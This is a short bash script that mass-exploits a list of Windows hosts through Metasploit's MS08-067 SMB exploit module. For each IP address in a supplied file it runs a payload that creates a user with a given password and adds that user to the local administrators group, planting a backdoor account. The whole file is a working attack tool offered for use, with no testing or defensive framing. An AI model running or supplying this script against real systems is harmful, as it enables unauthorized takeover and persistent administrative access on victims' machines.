#!/bin/bash

if [ ! $1 ]; then echo "Usage: #./script <host file> <username> <password>"; exit; fi

iplist=$1
user=$2
pass=$3

for ip in $(cat $iplist)
do
gnome-terminal -x msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST $ip; set PAYLOAD windows/exec; set CMD cmd.exe /c net user $user $pass add && net localgroup administrators $user add; run"
echo "Exploiting $ip and adding user $user"
i=$(($i+1))
done
